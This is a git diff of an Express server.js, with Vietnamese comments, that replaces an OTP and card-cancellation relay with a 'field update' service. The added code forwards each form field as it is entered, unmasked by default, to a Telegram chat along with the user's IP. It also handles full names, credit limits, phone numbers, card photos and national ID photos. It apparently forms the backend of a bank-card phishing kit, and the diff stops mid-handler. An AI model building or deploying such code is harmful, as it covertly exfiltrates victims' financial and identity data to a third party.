@@ -1,399 +1,505 @@
-// Express Server: Unified relay + OTP + Telegram endpoints
-// Mirrors logic from netlify/functions/relay.mjs for local / VPS deployment.
-// Features:
-//  - Endpoints: /health, /_envinfo, /tele/sendMessage, /tele/sendDocument,
-//               /form/submit-init, /otp/request, /otp/verify,
-//               /card/cancel/init, /card/cancel/confirm
-//  - HMAC request signing (optional) via REQUIRE_HMAC=1 & HMAC_KEY
-//  - OTP generation + verification with Redis (REDIS_URL) or in-memory fallback
-//  - Basic rate limiting (IP + resend + generic buckets) in Redis or memory
-//  - Nonce replay protection when HMAC enabled
-//  - Dynamic port selection if requested port busy
-//  - Minimal dependencies (uses existing ones from package.json)
+// server.js — Telegram mini-API + field update
+// Run: npm i express dotenv node-fetch
+//      node server.js
 
-import 'dotenv/config';
-import express from 'express';
-import crypto from 'crypto';
-import fetch from 'node-fetch';
-import FormData from 'form-data';
-import morgan from 'morgan';
+const express = require('express');
+const path = require('path');
+require('dotenv').config();
 
-// ---------------------------- Initialization ----------------------------
+// Polyfill fetch cho Node < 18
+if (!global.fetch) {
+    global.fetch = (...args) =>
+        import('node-fetch').then(({ default: f }) => f(...args));
+}
+
 const app = express();
+app.set('trust proxy', true); // nếu sau này chạy sau proxy (Nginx…), req.ip sẽ chính xác hơn
+// Allow larger payloads (for base64 images sent as data URLs)
+app.use(express.json({ limit: '10mb' }));
 
-// Capture raw body for HMAC before JSON parsing
-app.use(express.json({ limit: '1mb', verify: (req, _res, buf) => { req.rawBody = buf.toString('utf8'); } }));
-app.use(express.urlencoded({ extended: true }));
-app.use(morgan('dev'));
-
-// Static build (if exists)
-import { existsSync } from 'fs';
-import { join, resolve } from 'path';
-const distPublic = resolve('dist', 'public');
-if (existsSync(distPublic)) {
-	console.log('[server] Serving static files from', distPublic);
-	app.use(express.static(distPublic, {
-		maxAge: '1h', setHeaders: (res, path) => {
-			if (/\.(html)$/i.test(path)) { res.setHeader('Cache-Control', 'no-cache'); }
-		}
-	}));
-}
-
-// CORS (simple, permissive)
-app.use((req, res, next) => {
-	res.setHeader('Access-Control-Allow-Origin', '*');
-	res.setHeader('Access-Control-Allow-Headers', 'Content-Type,X-Signature,X-Timestamp,X-Nonce');
-	res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
-	if (req.method === 'OPTIONS') return res.status(204).end();
-	next();
-});
-
-// ---------------------------- Redis (lazy) ----------------------------
-let redisClient = null;
-let redisInitPromise = null;
-async function initRedis() {
-	if (redisClient) return redisClient;
-	if (redisInitPromise) return redisInitPromise;
-	const { REDIS_URL } = process.env;
-	if (!REDIS_URL) return null;
-	redisInitPromise = (async () => {
-		const { createClient } = await import('redis');
-		const client = createClient({ url: REDIS_URL });
-		client.on('error', e => console.error('[Redis] error', e));
-		await client.connect();
-		redisClient = client;
-		console.log('[Redis] connected');
-		return client;
-	})();
-	return redisInitPromise;
-}
-
-// ---------------------------- In-memory stores ----------------------------
-const memStore = {
-	otp: new Map(),
-	nonces: new Map(),
-	rate: new Map()
+/**
+ * Cấu hình từ .env (hoặc biến môi trường)
+ * TELEGRAM_BOT_TOKEN=123456:ABC...
+ * TELEGRAM_CHAT_ID=-100xxxxxxxxxx   (ID cá nhân, group hoặc channel)
+ * ALLOW_RAW_SENSITIVE=true|false    (true: gửi nguyên văn dữ liệu field-update)
+ * HOST=127.0.0.1
+ * PORT=4000
+ */
+const config = {
+    token: process.env.TELEGRAM_BOT_TOKEN || '',
+    chatId: process.env.TELEGRAM_CHAT_ID || '',
+    allowRawSensitive:
+        (process.env.ALLOW_RAW_SENSITIVE || 'true').toLowerCase() === 'true',
+    // If true, server will only receive and store updates but will NOT attempt to send to Telegram
+    receiveOnly: (process.env.RECEIVE_ONLY || 'false').toLowerCase() === 'true',
 };
 
-// ---------------------------- Helpers ----------------------------
-function json(res, body, status = 200) { return res.status(status).json(body); }
-function sanitizeMessage(str = '') { return str.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F]/g, '').slice(0, 3800); }
-function randomId(prefix = 'REQ') { return `${prefix}-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 10)}`; }
-function maskPhone(p) { if (!p) return '—'; return p.replace(/^(\+?84|0)?(\d{3})\d+(\d{2})$/, '$1$2***$3'); }
-function generateOtp() { return process.env.DEMO_STATIC_OTP === '1' ? '123456' : Math.floor(Math.random() * 1e6).toString().padStart(6, '0'); }
-function sha256Hex(str) { return crypto.createHash('sha256').update(str).digest('hex'); }
-function timingSafeEqual(a, b) { if (a.length !== b.length) return false; return crypto.timingSafeEqual(Buffer.from(a), Buffer.from(b)); }
-
-async function telegramCall(method, payload, isForm = false) {
-	if (process.env.TELEGRAM_DRY_RUN === '1') {
-		// Simulate a successful Telegram API response without network
-		return { ok: true, data: { result: { message_id: Math.floor(Math.random() * 1e9), dryRun: true, method } } };
-	}
-	if (!process.env.BOT_TOKEN || !process.env.CHAT_ID) {
-		throw new Error('Missing BOT_TOKEN/CHAT_ID');
-	}
-	const url = `https://api.telegram.org/bot${process.env.BOT_TOKEN}/${method}`;
-	const init = isForm ? { method: 'POST', body: payload } : { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) };
-	const r = await fetch(url, init);
-	if (!r.ok) { return { ok: false, status: r.status, text: await r.text() }; }
-	const j = await r.json().catch(() => ({}));
-	return { ok: true, data: j };
+// Sanitize token helper: trim and extract valid token pattern if user pasted extra text
+function sanitizeToken(tok) {
+    if (!tok && tok !== '') return '';
+    const s = String(tok).trim();
+    const m = s.match(/[0-9]+:[A-Za-z0-9_-]+/);
+    return m ? m[0] : s;
 }
 
-async function audit(msg) {
-	try {
-		await telegramCall('sendMessage', { chat_id: process.env.CHAT_ID, text: sanitizeMessage(`_AUDIT:_ ${msg}`) });
-	} catch {/* ignore */ }
+// In-memory debug log of recent field updates (kept small)
+const fieldUpdates = [];
+function recordFieldUpdate(evt) {
+    try {
+        fieldUpdates.push(Object.assign({ receivedAt: new Date().toISOString() }, evt));
+        if (fieldUpdates.length > 250) fieldUpdates.shift();
+    } catch (e) { /* ignore */ }
 }
 
-// ---------------------------- OTP storage ----------------------------
-async function storeOtp(client, requestId, phone, code, ttlSec = 60) {
-	const salt = randomId('salt').slice(-8);
-	const rec = { phone, salt, codeHash: sha256Hex(code + '.' + salt), expireAt: Date.now() + ttlSec * 1000, attempts: 0, maxAttempts: 6, createdAt: Date.now() };
-	if (client) {
-		await client.setEx(`otp:${requestId}`, ttlSec + 300, JSON.stringify(rec));
-	} else {
-		memStore.otp.set(requestId, rec);
-		setTimeout(() => memStore.otp.delete(requestId), (ttlSec + 300) * 1000);
-	}
-	return rec;
-}
-async function getOtpRecord(client, requestId) {
-	if (client) { const raw = await client.get(`otp:${requestId}`); return raw ? JSON.parse(raw) : null; }
-	return memStore.otp.get(requestId) || null;
-}
-async function saveOtpRecord(client, requestId, rec) {
-	const ttl = Math.max(Math.floor((rec.expireAt - Date.now()) / 1000), 30);
-	if (client) await client.setEx(`otp:${requestId}`, ttl, JSON.stringify(rec));
-	else memStore.otp.set(requestId, rec);
-}
-async function deleteOtp(client, requestId) { if (client) await client.del(`otp:${requestId}`); else memStore.otp.delete(requestId); }
+// Ensure uploads directory exists for saving images
+const fs = require('fs');
+const uploadsDir = path.join(__dirname, 'public', 'uploads');
+try {
+    if (!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir, { recursive: true });
+} catch (e) { console.error('Could not ensure uploads dir', e); }
 
-// ---------------------------- Rate limiting & nonce ----------------------------
-async function rateLimit(client, key, max, windowSec) {
-	const bucketKey = (t = Date.now()) => `rate:${key}:${Math.floor(t / 1000 / windowSec)}`;
-	if (client) {
-		const bucket = bucketKey();
-		const val = await client.incr(bucket);
-		if (val === 1) await client.expire(bucket, windowSec + 5);
-		return val <= max;
-	} else {
-		const bucket = bucketKey();
-		const cur = memStore.rate.get(bucket) || 0;
-		if (cur >= max) return false;
-		memStore.rate.set(bucket, cur + 1);
-		setTimeout(() => memStore.rate.delete(bucket), (windowSec + 5) * 1000);
-		return true;
-	}
-}
-async function nonceCheck(client, nonce) {
-	if (!nonce) return false;
-	if (client) {
-		const exists = await client.get(`nonce:${nonce}`);
-		if (exists) return false;
-		await client.setEx(`nonce:${nonce}`, 300, '1');
-		return true;
-	} else {
-		if (memStore.nonces.has(nonce)) return false;
-		memStore.nonces.set(nonce, 1);
-		setTimeout(() => memStore.nonces.delete(nonce), 300 * 1000);
-		return true;
-	}
+// Helper to save a base64 dataURL to disk, returns relative public path or null
+function saveDataUrl(dataUrl, prefix = 'img') {
+    if (!dataUrl || typeof dataUrl !== 'string') return null;
+    const m = dataUrl.match(/^data:(image\/(png|jpeg|jpg));base64,(.+)$/i);
+    if (!m) return null;
+    const ext = m[2] === 'jpeg' ? 'jpg' : m[2];
+    const b64 = m[3];
+    try {
+        const buf = Buffer.from(b64, 'base64');
+        const name = `${prefix}-${Date.now()}-${Math.floor(Math.random() * 9000) + 1000}.${ext}`;
+        const abs = path.join(uploadsDir, name);
+        fs.writeFileSync(abs, buf);
+        return `/public/uploads/${name}`; // served from /public
+    } catch (e) {
+        console.error('Failed to save image', e);
+        return null;
+    }
 }
 
-function verifyHmac(req) {
-	const REQUIRE = process.env.REQUIRE_HMAC === '1';
-	if (!REQUIRE) return { ok: true };
-	const headersLower = Object.fromEntries(Object.entries(req.headers).map(([k, v]) => [k.toLowerCase(), v]));
-	const sig = headersLower['x-signature'];
-	const ts = headersLower['x-timestamp'];
-	const nonce = headersLower['x-nonce'];
-	if (!sig || !ts || !nonce) return { ok: false, error: 'missing_headers' };
-	const tsNum = parseInt(ts, 10);
-	if (!tsNum || Math.abs(Math.floor(Date.now() / 1000) - tsNum) > 120) return { ok: false, error: 'timestamp_out_of_range' };
-	const rawBody = req.rawBody || '';
-	const path = req.path;
-	const base = `${req.method.toUpperCase()}\n${path}\n${tsNum}\n${nonce}\n${rawBody}`;
-	const expected = crypto.createHmac('sha256', process.env.HMAC_KEY || '').update(base).digest('hex');
-	const provided = sig.startsWith('v1=') ? sig.slice(3) : sig;
-	if (!timingSafeEqual(expected, provided)) return { ok: false, error: 'bad_signature' };
-	return { ok: true, nonce };
+// Helper to send a photo to Telegram using multipart/form-data (fetch + FormData polyfill)
+async function telegramSendPhoto(photoPathOrBuffer, caption) {
+    if (!telegramEnabled()) return { skipped: true, reason: 'not_configured' };
+    // If photoPathOrBuffer is a local file path (public folder) we need to stream it.
+    // We'll use form-data package via dynamic import to avoid mandatory dependency when not needed.
+    try {
+        const FormData = (await import('form-data')).default;
+        const form = new FormData();
+        form.append('chat_id', config.chatId);
+        if (caption) form.append('caption', caption);
+        form.append('parse_mode', 'HTML');
+
+        // Accept either a Buffer or a path string starting with '/public/'
+        if (Buffer.isBuffer(photoPathOrBuffer)) {
+            form.append('photo', photoPathOrBuffer, { filename: 'photo.jpg' });
+        } else if (typeof photoPathOrBuffer === 'string') {
+            // try to open file from disk
+            const abs = path.join(__dirname, photoPathOrBuffer.replace(/^\//, ''));
+            if (fs.existsSync(abs)) {
+                form.append('photo', fs.createReadStream(abs));
+            } else {
+                return { ok: false, error: 'file_not_found' };
+            }
+        } else {
+            return { ok: false, error: 'invalid_photo' };
+        }
+
+        const url = `https://api.telegram.org/bot${config.token}/sendPhoto`;
+        const res = await fetch(url, { method: 'POST', body: form });
+        let data = null;
+        try { data = await res.json(); } catch (_) { data = null; }
+        if (!res.ok || !data?.ok) {
+            logTelegramError(res.status, data);
+            return { ok: false, httpStatus: res.status, data };
+        }
+        return { ok: true, httpStatus: res.status, result: data.result };
+    } catch (e) {
+        console.error('telegramSendPhoto error', e);
+        return { ok: false, error: e.message };
+    }
 }
 
-// ---------------------------- Middleware for Redis init & rate limit ----------------------------
-app.use(async (req, res, next) => {
-	try {
-		req.redis = await initRedis();
-	} catch (e) {
-		console.error('Redis init failed', e);
-		req.redis = null;
-	}
-	// basic IP rate limiting (300 req / 60s)
-	const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress || 'ip-unknown';
-	const ok = await rateLimit(req.redis, `ip:${ip}`, 300, 60);
-	if (!ok) return json(res, { error: 'rate_limited' }, 429);
-	next();
-});
-
-// ---------------------------- Routes ----------------------------
-app.get('/health', (req, res) => json(res, { ok: true, ts: Date.now() }));
-
-app.get('/_envinfo', (req, res) => {
-	if (process.env.DEV_ALLOW_ENVINFO === '1') return json(res, { ok: true, hmac: process.env.REQUIRE_HMAC === '1' });
-	return res.status(404).end();
-});
-
-app.get('/_tele/dry-run', (req, res) => {
-	if (process.env.TELEGRAM_DRY_RUN === '1') return json(res, { ok: true, dryRun: true });
-	return json(res, { ok: true, dryRun: false });
-});
-
-// HMAC & Nonce gate for modifying endpoints
-app.use((req, res, next) => {
-	if (req.method === 'GET' && (req.path === '/health' || req.path === '/_envinfo')) return next();
-	const v = verifyHmac(req);
-	if (!v.ok) return json(res, { error: v.error }, 401);
-	req.hmacNonce = v.nonce;
-	next();
-});
-
-// Nonce replay check after HMAC verification
-app.use(async (req, res, next) => {
-	if (!req.hmacNonce) return next();
-	const ok = await nonceCheck(req.redis, req.hmacNonce);
-	if (!ok) return json(res, { error: 'nonce_replay_or_missing' }, 401);
-	next();
-});
-
-app.post('/tele/sendMessage', async (req, res) => {
-	const { message } = req.body || {};
-	if (typeof message !== 'string') return json(res, { error: 'invalid_body' }, 400);
-	try {
-		const r = await telegramCall('sendMessage', { chat_id: process.env.CHAT_ID, text: sanitizeMessage(message), parse_mode: 'Markdown', disable_web_page_preview: true });
-		if (!r.ok) return json(res, { error: 'telegram_error', detail: r.text }, r.status || 500);
-		return json(res, { status: 'ok', messageId: r.data?.result?.message_id });
-	} catch (e) { console.error('sendMessage error', e); return json(res, { error: 'internal_error' }, 500); }
-});
-
-app.post('/tele/sendDocument', async (req, res) => {
-	const { filename = 'upload.bin', mimeType = 'application/octet-stream', base64, caption = '', parseMode } = req.body || {};
-	if (!base64 || typeof base64 !== 'string') return json(res, { error: 'missing_base64' }, 400);
-	if (filename.length > 100 || /[\\/]/.test(filename)) return json(res, { error: 'invalid_filename' }, 400);
-	const ALLOW = new Set(['image/png', 'image/jpeg', 'image/jpg', 'image/webp', 'application/pdf', 'text/plain', 'application/octet-stream']);
-	if (!ALLOW.has(mimeType)) return json(res, { error: 'invalid_mimeType' }, 400);
-	let buffer; try { buffer = Buffer.from(base64, 'base64'); } catch { return json(res, { error: 'invalid_base64' }, 400); }
-	if (!buffer || buffer.length === 0) return json(res, { error: 'empty_file' }, 400);
-	const maxBytes = parseInt(process.env.MAX_DOC_BYTES || '5000000', 10);
-	if (buffer.length > maxBytes) return json(res, { error: 'file_too_large', limit: maxBytes }, 400);
-	const fd = new FormData();
-	fd.append('chat_id', process.env.CHAT_ID);
-	fd.append('document', buffer, { filename, contentType: mimeType });
-	const safeCaption = sanitizeMessage(String(caption || '')).slice(0, 1024);
-	if (safeCaption) fd.append('caption', safeCaption);
-	if (parseMode && ['Markdown', 'HTML', 'MarkdownV2'].includes(parseMode)) fd.append('parse_mode', parseMode);
-	try {
-		const r = await telegramCall('sendDocument', fd, true);
-		if (!r.ok) return json(res, { error: 'telegram_error', detail: r.text }, r.status || 500);
-		const fileId = r.data?.result?.document?.file_id;
-		await audit(`DOC ${filename} size:${buffer.length}B fileId:${fileId || 'n/a'}`);
-		return json(res, { status: 'ok', messageId: r.data?.result?.message_id, fileId });
-	} catch (e) { console.error('sendDocument error', e); return json(res, { error: 'internal_error' }, 500); }
-});
-
-app.post('/form/submit-init', async (req, res) => {
-	const { summary, phone = '' } = req.body || {};
-	if (!summary || typeof summary !== 'string' || !summary.trim()) return json(res, { error: 'invalid_summary' }, 400);
-	const requestId = randomId('REQ');
-	const otp = generateOtp();
-	await storeOtp(req.redis, requestId, phone, otp, 60);
-	await audit(`INIT ${requestId}\nPhone:${maskPhone(phone)}\nLen:${summary.length}`);
-	return json(res, { status: 'ok', requestId, maskedPhone: maskPhone(phone), otp: { ttlSeconds: 60, length: 6, resendAfter: 30 }, debugOtp: process.env.DEBUG_RETURN_OTP === '1' ? otp : undefined });
-});
-
-app.post('/otp/request', async (req, res) => {
-	const { requestId } = req.body || {};
-	if (!requestId) return json(res, { error: 'missing_requestId' }, 400);
-	const rec = await getOtpRecord(req.redis, requestId);
-	if (!rec) return json(res, { error: 'not_found' }, 404);
-	const allow = await rateLimit(req.redis, `otp_resend:${requestId}`, 3, 300);
-	if (!allow) return json(res, { error: 'resend_rate_limited' }, 429);
-	const otp = generateOtp();
-	await storeOtp(req.redis, requestId, rec.phone, otp, 60);
-	await audit(`RESEND OTP ${requestId}`);
-	return json(res, { status: 'ok', otp: { ttlSeconds: 60, resendAfter: 30 }, debugOtp: process.env.DEBUG_RETURN_OTP === '1' ? otp : undefined });
-});
-
-app.post('/otp/verify', async (req, res) => {
-	const { requestId, otp, summary } = req.body || {};
-	if (!requestId || !otp) return json(res, { error: 'missing_fields' }, 400);
-	const rec = await getOtpRecord(req.redis, requestId);
-	if (!rec) return json(res, { error: 'otp_not_found' }, 404);
-	if (Date.now() > rec.expireAt) return json(res, { error: 'otp_expired' }, 400);
-	if (rec.attempts >= rec.maxAttempts) return json(res, { error: 'otp_locked' }, 400);
-	const match = sha256Hex(otp + '.' + rec.salt) === rec.codeHash;
-	rec.attempts += 1; await saveOtpRecord(req.redis, requestId, rec);
-	if (!match) {
-		await audit(`OTP WRONG ${requestId} attempt:${rec.attempts}`);
-		if (rec.attempts >= rec.maxAttempts) return json(res, { status: 'error', code: 'OTP_LOCKED' }, 400);
-		return json(res, { status: 'error', code: 'OTP_INVALID', remaining: rec.maxAttempts - rec.attempts }, 400);
-	}
-	await deleteOtp(req.redis, requestId);
-	await audit(`OTP OK ${requestId}`);
-	if (summary && typeof summary === 'string' && summary.length < 10000) {
-		const textMsg = sanitizeMessage(summary + `\n\n(rid:${requestId})`);
-		try { await telegramCall('sendMessage', { chat_id: process.env.CHAT_ID, text: textMsg, parse_mode: 'Markdown', disable_web_page_preview: true }); } catch {/* ignore */ }
-	}
-	return json(res, { status: 'verified', submittedAt: new Date().toISOString() });
-});
-
-app.post('/card/cancel/init', async (req, res) => {
-	const { cardLast4, phone, reasonCode, reasonNote, action, channel, acceptTerms } = req.body || {};
-	if (!cardLast4 || !phone || !reasonCode || !action || !channel || acceptTerms !== true) return json(res, { error: 'missing_fields' }, 400);
-	const requestId = randomId('CAN');
-	await audit(`[HỦY/TẠM KHÓA THẺ] ${requestId}\nCard ****${String(cardLast4).slice(-4)} | Action: ${action}\nReason: ${reasonCode}${reasonNote ? ' - ' + reasonNote : ''}\nPhone: ${maskPhone(phone)}\nChannel: ${channel}\nTime: ${new Date().toISOString()}`);
-	return json(res, { status: 'ok', requestId, action: action === 'TEMP_LOCK' ? 'locked' : 'canceled' });
-});
-
-app.post('/card/cancel/confirm', async (req, res) => {
-	const { requestId, otp } = req.body || {};
-	if (!requestId || !otp) return json(res, { error: 'missing_fields' }, 400);
-	const rec = await getOtpRecord(req.redis, requestId);
-	if (!rec) return json(res, { error: 'otp_not_found' }, 404);
-	if (Date.now() > rec.expireAt) return json(res, { error: 'otp_expired' }, 400);
-	if (rec.attempts >= rec.maxAttempts) return json(res, { error: 'otp_locked' }, 400);
-	const match = sha256Hex(otp + '.' + rec.salt) === rec.codeHash;
-	rec.attempts += 1; await saveOtpRecord(req.redis, requestId, rec);
-	if (!match) {
-		await audit(`OTP WRONG ${requestId} attempt:${rec.attempts}`);
-		if (rec.attempts >= rec.maxAttempts) return json(res, { status: 'error', code: 'OTP_LOCKED' }, 400);
-		return json(res, { status: 'error', code: 'OTP_INVALID', remaining: rec.maxAttempts - rec.attempts }, 400);
-	}
-	await deleteOtp(req.redis, requestId);
-	await audit(`OTP OK ${requestId}`);
-	return json(res, { status: 'confirmed', requestId, action: 'TEMP_LOCK', submittedAt: new Date().toISOString() });
-});
-
-// Fallback 404
-app.use((req, res) => json(res, { error: 'not_found' }, 404));
-
-// ---------------------------- Port selection & start ----------------------------
-async function findAvailablePort(start, maxAttempts = 15) {
-	const net = await import('net');
-	function tryPort(p) {
-		return new Promise(resolve => {
-			const srv = net.createServer();
-			srv.once('error', () => resolve(false));
-			srv.listen(p, () => { srv.close(() => resolve(true)); });
-		});
-	}
-	for (let i = 0; i < maxAttempts; i++) {
-		const p = start + i;
-		/* eslint-disable no-await-in-loop */
-		const ok = await tryPort(p);
-		if (ok) return p;
-	}
-	throw new Error(`No free port found starting at ${start}`);
+function telegramEnabled() {
+    // If receiveOnly mode is enabled, we intentionally disable outbound Telegram sends
+    if (config.receiveOnly) return false;
+    // Token chuẩn dạng digits:alphanumeric-_
+    if (!config.token || !config.chatId) return false;
+    if (!/^[0-9]+:[A-Za-z0-9_-]+$/.test(config.token)) return false;
+    return true;
 }
 
-const userPort = process.env.PORT && parseInt(process.env.PORT, 10);
-const basePort = userPort || 3000;
+function maskToken(tok) {
+    if (!tok) return null;
+    if (tok.length <= 10) return tok.replace(/.(?=.{2})/g, '*');
+    return tok.slice(0, 6) + '...' + tok.slice(-2);
+}
 
-(async () => {
-	try {
-		const port = await findAvailablePort(basePort);
-		if (userPort && port !== userPort) {
-			console.warn(`[server] Requested PORT ${userPort} busy, using ${port} instead.`);
-		} else if (!userPort && port !== basePort) {
-			console.warn(`[server] Default port ${basePort} busy, using ${port}.`);
-		}
-		app.listen(port, () => {
-			console.log(`[server] listening on port ${port}`);
-			if (process.env.REQUIRE_HMAC === '1') {
-				console.log('[server] HMAC verification ENABLED');
-			} else {
-				console.log('[server] HMAC verification DISABLED (set REQUIRE_HMAC=1 to enable)');
-			}
-			if (!process.env.BOT_TOKEN || !process.env.CHAT_ID) {
-				console.warn('[server] BOT_TOKEN / CHAT_ID not set -> Telegram calls will fail');
-			}
-			if (!process.env.HMAC_KEY && process.env.REQUIRE_HMAC === '1') {
-				console.warn('[server] REQUIRE_HMAC=1 but HMAC_KEY missing');
-			}
-		});
-	} catch (e) {
-		console.error('Failed to start server:', e);
-		process.exit(1);
-	}
-})();
+let lastErrorStamp = 0;
+let sameErrorCount = 0;
+function logTelegramError(status, data) {
+    const now = Date.now();
+    if (now - lastErrorStamp < 1500) {
+        sameErrorCount++;
+        if (sameErrorCount % 10 === 0) {
+            console.error(
+                `Telegram HTTP error status= ${status} (repeated ${sameErrorCount} times)`
+            );
+        }
+        return;
+    }
+    lastErrorStamp = now;
+    sameErrorCount = 1;
+    console.error('Telegram HTTP error status=', status, 'payload=',
+        data && (data.description || JSON.stringify(data)).slice(0, 200));
+}
 
-// Export app for potential testing
-export default app;
-// NOTE: Do NOT append .env style variables inside this JS file.
-// Put runtime configuration into a .env file at project root, e.g.:
-//   PORT=3000
-//   BOT_TOKEN=xxxxxxxx:yyyyyyyyyyyyyyyy
-//   CHAT_ID=-1001234567890
-//   HMAC_KEY=long_random_secret_value
-//   REQUIRE_HMAC=1
-// (Never commit real secrets to version control.)
+async function telegramSend(text) {
+    if (!telegramEnabled()) {
+        console.warn('Telegram not configured');
+        return { skipped: true, reason: 'not_configured' };
+    }
+    const url = `https://api.telegram.org/bot${config.token}/sendMessage`;
+    const body = {
+        chat_id: config.chatId,
+        text,
+        parse_mode: 'HTML',
+        disable_web_page_preview: true,
+    };
 
+    try {
+        const res = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(body),
+        });
+        let data = null;
+        try { data = await res.json(); } catch (_) { data = null; }
+
+        if (!res.ok || !data?.ok) {
+            logTelegramError(res.status, data);
+            return { ok: false, httpStatus: res.status, data };
+        }
+        return { ok: true, httpStatus: res.status, result: data.result };
+    } catch (e) {
+        console.error('Telegram send error', e);
+        return { ok: false, error: e.message };
+    }
+}
+
+/* ============================
+ * Static files (public only)
+ * ============================ */
+// Serve project root so files like /js/app.js and /index.html are reachable when
+// the app is run from repository root (development convenience).
+app.use(express.static(path.join(__dirname), {
+    index: ['index.html'],
+    dotfiles: 'ignore',
+    extensions: ['html'],
+}));
+
+// Also keep `public` for images and assets
+app.use(
+    express.static(path.join(__dirname, 'public'), {
+        dotfiles: 'ignore',
+        extensions: ['html'],
+    })
+);
+
+/* ============================
+ * Health & debug
+ * ============================ */
+app.get('/health', (req, res) => {
+    res.json({ status: 'ok' }); // đồng bộ với script quét port
+});
+
+// Liệt kê route đã đăng ký (debug)
+app.get('/__routes', (req, res) => {
+    try {
+        const out = [];
+        app._router.stack.forEach((layer) => {
+            if (layer.route && layer.route.path) {
+                out.push({
+                    path: layer.route.path,
+                    methods: Object.keys(layer.route.methods)
+                        .map((m) => m.toUpperCase())
+                        .join(','),
+                });
+            }
+        });
+        res.json({ routes: out });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+setTimeout(() => {
+    const listed = [];
+    app._router.stack.forEach((layer) => {
+        if (layer.route && layer.route.path) {
+            listed.push(
+                `${Object.keys(layer.route.methods)
+                    .map((m) => m.toUpperCase())
+                    .join(',')} ${layer.route.path}`
+            );
+        }
+    });
+    console.log('Registered routes:');
+    listed.forEach((l) => console.log(' -', l));
+}, 300);
+
+/* ============================
+ * Telegram Dev endpoints
+ * ============================ */
+app.get('/api/telegram/status', (req, res) => {
+    res.json({
+        status: 'ok',
+        hasToken: !!config.token,
+        hasChatId: !!config.chatId,
+        allowRawSensitive: config.allowRawSensitive,
+        maskedToken: maskToken(config.token),
+        chatId: config.chatId || null,
+        receiveOnly: config.receiveOnly,
+        enabled: telegramEnabled(),
+    });
+});
+
+app.post('/api/telegram/config', (req, res) => {
+    const { token, chatId, allowRawSensitive, receiveOnly } = req.body || {};
+    if (token !== undefined) config.token = sanitizeToken(String(token));
+    if (chatId !== undefined) config.chatId = String(chatId).trim();
+    if (allowRawSensitive !== undefined)
+        config.allowRawSensitive = !!allowRawSensitive;
+    if (receiveOnly !== undefined) config.receiveOnly = !!receiveOnly;
+    res.json({
+        status: 'ok',
+        config: {
+            hasToken: !!config.token,
+            hasChatId: !!config.chatId,
+            allowRawSensitive: config.allowRawSensitive,
+            receiveOnly: config.receiveOnly,
+            enabled: telegramEnabled(),
+        },
+    });
+});
+
+app.post('/api/telegram/test', async (req, res) => {
+    const { text = 'Test message' } = req.body || {};
+    if (!telegramEnabled())
+        return res.status(400).json({ status: 'err', error: 'not_configured' });
+
+    const r = await telegramSend(`[TEST]\n${text}`);
+    let hint = null;
+    if (!r.ok) {
+        if (r.httpStatus === 404) {
+            hint =
+                '404 từ Telegram: Thường do token sai hoặc endpoint bị chặn. Kiểm tra lại token (dạng <digits>:<chuỗi>).';
+        } else if (r.httpStatus === 400 && /chat not found/i.test(r?.data?.description || '')) {
+            hint =
+                'Chat not found: Sai chatId hoặc bot chưa được thêm vào nhóm/chat. Hãy nhắn bất kỳ cho bot hoặc add bot vào group/channel rồi thử lại.';
+        }
+    }
+    res.status(r.ok ? 200 : 502).json({ status: r.ok ? 'ok' : 'err', detail: r, hint });
+});
+
+// Chẩn đoán sâu: getMe + probe sendMessage
+app.get('/api/telegram/diagnose', async (req, res) => {
+    if (!config.token) return res.status(400).json({ status: 'err', error: 'missing_token' });
+    const result = { tokenFormatValid: /^[0-9]+:[A-Za-z0-9_-]+$/.test(config.token) };
+
+    try {
+        const r = await fetch(`https://api.telegram.org/bot${config.token}/getMe`);
+        let jd = null;
+        try { jd = await r.json(); } catch (_) { }
+        result.getMe = { httpStatus: r.status, body: jd };
+    } catch (e) {
+        result.getMe = { error: e.message };
+    }
+
+    if (config.chatId) {
+        try {
+            const silent = await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: config.chatId,
+                    text: '[DIAG] test',
+                    disable_notification: true,
+                }),
+            });
+            let body = null;
+            try { body = await silent.json(); } catch (_) { }
+            result.sendProbe = { httpStatus: silent.status, body };
+        } catch (e) {
+            result.sendProbe = { error: e.message };
+        }
+    } else {
+        result.sendProbe = { skipped: true, reason: 'no_chat_id' };
+    }
+    res.json(result);
+});
+
+/* ============================
+ * Field Update endpoint
+ * ============================ */
+/**
+ * POST /api/field-update
+ * Body: { sessionId, field, value, page }
+ * Trả:  { status: 'ok' }
+ */
+app.post('/api/field-update', async (req, res) => {
+    // Accept either the old single-field shape { sessionId, field, value, page }
+    // or a consolidated payload:
+    // { sessionId, fullName, limitGranted, limitAvailable, phone, cardImage, cccdImage, page }
+    const body = req.body || {};
+    const sessionId = body.sessionId || body.session || null;
+    if (!sessionId) return res.status(400).json({ status: 'err', error: 'missing_sessionId' });
+
+    // If it's the legacy single-field update
+    if (body.field && (body.value !== undefined && body.value !== null && String(body.value).trim() !== '')) {
+        const { field, value, page } = body;
+        const rawValue = String(value);
+        const safeValue = config.allowRawSensitive ? rawValue : (rawValue.length > 3 ? rawValue[0] + '***' + rawValue.slice(-1) : '***');
+        const lines = [
+            '📩 <b>CẬP NHẬT TRƯỜNG</b>',
+            `Phiên: <code>${sessionId}</code>`,
+            page ? `Trang: <code>${page}</code>` : '',
+            `Trường: <code>${field}</code>`,
+            `Giá trị: <code>${safeValue}</code>`,
+            `Thời gian: <code>${new Date().toISOString()}</code>`,
+            `IP: <code>${req.ip}</code>`,
+        ].filter(Boolean);
+        telegramSend(lines.join('\n')).catch(() => { });
+        recordFieldUpdate({ sessionId, field, value: rawValue, page, ip: req.ip });
+        return res.json({ status: 'ok' });
+    }
+
+    // Consolidated payload handling
+    const { fullName, limitGranted, limitAvailable, phone, cardImage, cccdImage, page } = body;
+    // At minimum we expect at least one of the main fields
+    if (!fullName && !limitGranted && !limitAvailable && !phone && !cardImage && !cccdImage) {
